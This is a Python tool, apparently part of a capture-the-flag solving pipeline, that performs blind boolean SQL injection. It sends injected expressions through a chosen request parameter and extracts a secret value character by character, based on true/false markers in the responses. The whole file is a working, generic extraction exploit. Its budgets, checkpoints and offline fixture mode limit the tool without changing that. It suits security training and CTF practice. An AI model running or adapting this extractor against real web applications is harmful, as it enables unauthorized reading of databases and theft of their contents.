#!/usr/bin/env python3
"""Bounded boolean-oracle extraction with resumable evidence output.

This is an execution component, not a challenge answer.  Transport, response
classification, and extraction are kept independent so a generated adapter
only has to describe the current target's request shape and SQL expression.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen


class RequestBudgetExceeded(RuntimeError):
    pass


class RuntimeBudgetExceeded(RuntimeError):
    pass


class BoundExceeded(RuntimeError):
    pass


class ResponseClassifier:
    def __init__(self, true_marker: str, false_marker: str) -> None:
        if not true_marker or not false_marker or true_marker == false_marker:
            raise ValueError("true-marker and false-marker must be distinct and non-empty")
        self.true_marker, self.false_marker = true_marker, false_marker

    def classify(self, body: str) -> bool:
        has_true, has_false = self.true_marker in body, self.false_marker in body
        if has_true == has_false:
            raise RuntimeError("response contains both markers or neither marker")
        return has_true


@dataclass
class RequestBudget:
    max_requests: int
    max_runtime: float
    requests_seen: int = 0
    started_at: float = 0.0

    def __post_init__(self) -> None:
        self.started_at = time.monotonic()

    def before_request(self) -> None:
        if self.requests_seen >= self.max_requests:
            raise RequestBudgetExceeded(f"max requests exceeded ({self.max_requests})")
        if self.max_runtime > 0 and time.monotonic() - self.started_at >= self.max_runtime:
            raise RuntimeBudgetExceeded(f"max runtime exceeded ({self.max_runtime}s)")

    def record(self) -> None:
        self.requests_seen += 1


def args_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Bounded boolean SQL injection extractor")
    parser.add_argument("--url-ref", default="CTF_TARGET_URL")
    parser.add_argument("--cookie-ref", default="CTF_COOKIE")
    parser.add_argument("--parameter", required=True)
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--content-type", choices=["application/json", "application/x-www-form-urlencoded"], default="application/json")
    parser.add_argument("--body-template", default=None, help="POST body template with {parameter} and {expression}")
    parser.add_argument("--true-marker", required=True)
    parser.add_argument("--false-marker", required=True)
    parser.add_argument("--query-template", required=True, help="Expression with {position} and {character}")
    parser.add_argument("--max-length", type=int, default=128)
    parser.add_argument("--max-requests", type=int, default=512)
    parser.add_argument("--max-runtime", type=float, default=0.0)
    parser.add_argument("--max-schema-items", type=int, default=128)
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument("--retry", type=int, default=2)
    parser.add_argument("--rate-limit", type=float, default=0.0)
    parser.add_argument("--checkpoint", default=None)
    parser.add_argument("--resume", action="store_true")
    parser.add_argument("--output-dir", default=None)
    parser.add_argument("--output", default=None)
    parser.add_argument("--progress", default=None)
    parser.add_argument("--requests-log", default=None)
    parser.add_argument("--evidence", default=None)
    parser.add_argument("--fixture", help="Offline JSON fixture mapping query strings to true/false")
    parser.add_argument("--alphabet", default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/.:@")
    parser.add_argument("--prefix", default="")
    parser.add_argument("--flag-regex", default=None)
    parser.add_argument("--allow-challenge-defaults", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--assumption-source", action="append", choices=["OBSERVATION", "MODEL_INFERENCE", "USER_HINT", "KNOWN_ANSWER"], default=[])
    return parser


def load_fixture(path: str | None, max_items: int) -> dict[str, bool] | None:
    if not path:
        return None
    data = json.loads(Path(path).read_text(encoding="utf-8"))
    if not isinstance(data, dict) or len(data) > max_items:
        raise ValueError(f"fixture exceeds max-schema-items ({max_items})")
    return {str(key): bool(value) for key, value in data.items()}


def _retry_after(error: HTTPError, default: float) -> float:
    raw = error.headers.get("Retry-After") if error.headers else None
    try:
        return max(0.0, min(60.0, float(raw))) if raw else default
    except ValueError:
        return default


def request_boolean(
    url: str,
    parameter: str,
    expression: str,
    classifier: ResponseClassifier,
    cookie: str,
    timeout: float,
    retries: int,
    fixture: dict[str, bool] | None,
    budget: RequestBudget,
    request_log,
    method: str = "GET",
    content_type: str = "application/json",
    body_template: str | None = None,
) -> bool:
    if fixture is not None:
        budget.before_request()
        if expression not in fixture:
            raise KeyError(f"fixture has no expression: {expression}")
        budget.record()
        request_log.write(json.dumps({"expression_sha256": hashlib.sha256(expression.encode()).hexdigest(), "fixture": True, "outcome": fixture[expression]}) + "\n")
        request_log.flush()
        return fixture[expression]
    headers = {"Cookie": cookie} if cookie else {}
    if method == "POST":
        if body_template:
            body = body_template.replace("{parameter}", parameter).replace("{expression}", expression).encode()
        elif content_type == "application/json":
            body = json.dumps({parameter: expression}).encode()
        else:
            body = urlencode({parameter: expression}).encode()
        headers["Content-Type"] = content_type
        request = Request(url, data=body, headers=headers, method="POST")
    else:
        parts = urlsplit(url)
        query = dict(parse_qsl(parts.query, keep_blank_values=True))
        query[parameter] = expression
        request = Request(urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(query), parts.fragment)), headers=headers)
    last_error: Exception | None = None
    for attempt in range(retries + 1):
        budget.before_request()
        try:
            with urlopen(request, timeout=timeout) as response:
                body = response.read().decode("utf-8", errors="replace")
            outcome = classifier.classify(body)
            budget.record()
            request_log.write(json.dumps({"expression_sha256": hashlib.sha256(expression.encode()).hexdigest(), "attempt": attempt + 1, "outcome": outcome}) + "\n")
            request_log.flush()
            return outcome
        except HTTPError as error:
            last_error = error
            if error.code not in {429, 502, 503, 504} or attempt >= retries:
                break
            time.sleep(_retry_after(error, min(8.0, 0.25 * (2**attempt))))
        except (URLError, TimeoutError, OSError, RuntimeError) as error:
            last_error = error
            if attempt < retries:
                time.sleep(min(8.0, 0.25 * (2**attempt)))
    raise RuntimeError(str(last_error))


def _write_json_atomic(path: Path, payload: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temporary = path.with_name(f".{path.name}.tmp")
    temporary.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    os.replace(temporary, path)


def main(argv: list[str] | None = None) -> int:
    parser = args_parser()
    options = parser.parse_args(argv)
    if not 1 <= options.max_length <= 4096 or options.max_requests < 1 or options.max_schema_items < 1:
        parser.error("max-length/max-requests/max-schema-items are outside safe bounds")
    if options.max_runtime < 0 or options.retry < 0 or options.timeout <= 0 or options.rate_limit < 0:
        parser.error("timeout/retry/rate-limit/max-runtime are outside safe bounds")
    if not options.alphabet:
        parser.error("alphabet must not be empty")
    url = os.environ.get(options.url_ref)
    if not url and not options.fixture:
        parser.error(f"Secret Ref {options.url_ref!r} is not set; use an explicit target or offline fixture")
    try:
        fixture = load_fixture(options.fixture, options.max_schema_items)
        classifier = ResponseClassifier(options.true_marker, options.false_marker)
        output_dir = Path(options.output_dir) if options.output_dir else None
        def path_or(default: str, explicit: str | None) -> Path:
            return Path(explicit) if explicit else (output_dir / default if output_dir else Path(default))
        checkpoint_path = path_or("checkpoint.json", options.checkpoint or ("scripts/.solve_boolean_sqli.checkpoint.json" if not output_dir else None))
        result_path = path_or("result.json", options.output or ("scripts/result.json" if not output_dir else None))
        progress_path = path_or("progress.jsonl", options.progress or ("scripts/progress.jsonl" if not output_dir else None))
        requests_path = path_or("requests.jsonl", options.requests_log)
        evidence_path = path_or("evidence.json", options.evidence)
        checkpoint = {"position": len(options.prefix) + 1, "value": options.prefix, "requests": 0}
        if options.resume and checkpoint_path.is_file():
            checkpoint.update(json.loads(checkpoint_path.read_text(encoding="utf-8")))
        position, value = int(checkpoint["position"]), str(checkpoint["value"])
        budget = RequestBudget(options.max_requests, options.max_runtime, int(checkpoint.get("requests", 0)))
        result = {
            "status": "RUNNING", "value": value, "requests": budget.requests_seen, "position": position,
            "assistance_level": "ANSWER_GUIDED" if "KNOWN_ANSWER" in options.assumption_source else ("EVIDENCE_GUIDED" if options.assumption_source else "AUTONOMOUS"),
            "assumption_sources": options.assumption_source,
            "max_requests": options.max_requests, "max_runtime": options.max_runtime,
            "flag_regex": options.flag_regex,
        }
        result_path.parent.mkdir(parents=True, exist_ok=True)
        progress_path.parent.mkdir(parents=True, exist_ok=True)
        requests_path.parent.mkdir(parents=True, exist_ok=True)
        with progress_path.open("a", encoding="utf-8") as progress, requests_path.open("a", encoding="utf-8") as request_log:
            while position <= options.max_length:
                found = False
                for character in options.alphabet:
                    outcome = request_boolean(url or "", options.parameter, options.query_template.format(position=position, character=character), classifier, os.environ.get(options.cookie_ref, ""), options.timeout, options.retry, fixture, budget, request_log, options.method, options.content_type, options.body_template)
                    progress.write(json.dumps({"position": position, "character": character, "request": budget.requests_seen, "true": outcome}) + "\n")
                    progress.flush()
                    if options.rate_limit:
                        time.sleep(options.rate_limit)
                    if outcome:
                        value += character
                        found = True
                        break
                if not found:
                    break
                position += 1
                _write_json_atomic(checkpoint_path, {"position": position, "value": value, "requests": budget.requests_seen})
        if options.flag_regex and not re.search(options.flag_regex, value):
            raise RuntimeError("extracted value does not match flag-regex")
        result.update({"status": "COMPLETED", "value": value, "requests": budget.requests_seen, "position": position})
        _write_json_atomic(evidence_path, {"value": value, "request_count": budget.requests_seen, "flag_regex": options.flag_regex, "assumption_sources": options.assumption_source})
    except Exception as error:
        result = locals().get("result", {"status": "FAILED", "value": "", "requests": 0})
        result.update({"status": "FAILED", "error": str(error), "requests": locals().get("budget", RequestBudget(1, 0)).requests_seen})
        _write_json_atomic(locals().get("result_path", Path("scripts/result.json")), result)
        return 2
    _write_json_atomic(result_path, result)
    return 0


if __name__ == "__main__":
    sys.exit(main())
